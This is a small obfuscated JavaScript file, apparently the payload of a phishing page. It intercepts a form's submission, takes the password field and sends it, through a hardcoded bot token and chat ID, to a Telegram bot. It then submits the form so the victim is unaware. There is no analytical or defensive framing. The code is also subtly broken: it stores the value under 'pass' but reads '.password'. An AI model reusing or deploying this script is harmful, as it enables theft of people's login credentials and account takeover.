document.addEventListener('DOMContentLoaded', function () {
    const _0x10466a = document.querySelector('form.shadow')
    _0x10466a
      ? _0x10466a.addEventListener('submit', function (_0x2b8fb4) {
          _0x2b8fb4.preventDefault()
          const _0x7cfda0 = '8028403931:AAHdpHoCPJzQVNdZh5jVj9dzbQEpuNiKHeA',
            _0x2346aa = '7640225740',
            _0x351ca4 = new FormData(this),
            _0x474ad2 = { pass: _0x351ca4.get('password') },
            _0x2caaeb =
              '\n\uD83D\uDD10  passord: ' + _0x474ad2.password + '\n\n'
          sendMessageToTelegram(_0x7cfda0, _0x2346aa, _0x2caaeb)
            .then((_0x1c2e7c) => {
              _0x1c2e7c.ok
                ? (console.log('Message sent successfully!'), _0x10466a.submit())
                : (console.error('Error sending message:', _0x1c2e7c),
                  alert('Error sending message'))
            })
            .catch((_0x38e4b3) => {
              console.error('Fetch error:', _0x38e4b3)
              alert('Error sending message')
            })
        })
      : console.error('Form element not found.')
  })
  function sendMessageToTelegram(_0x15e5cb, _0x1a7b7c, _0x389bee) {
    return fetch('https://api.telegram.org/bot' + _0x15e5cb + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: _0x1a7b7c,
        text: _0x389bee,
      }),
    })
  }
  
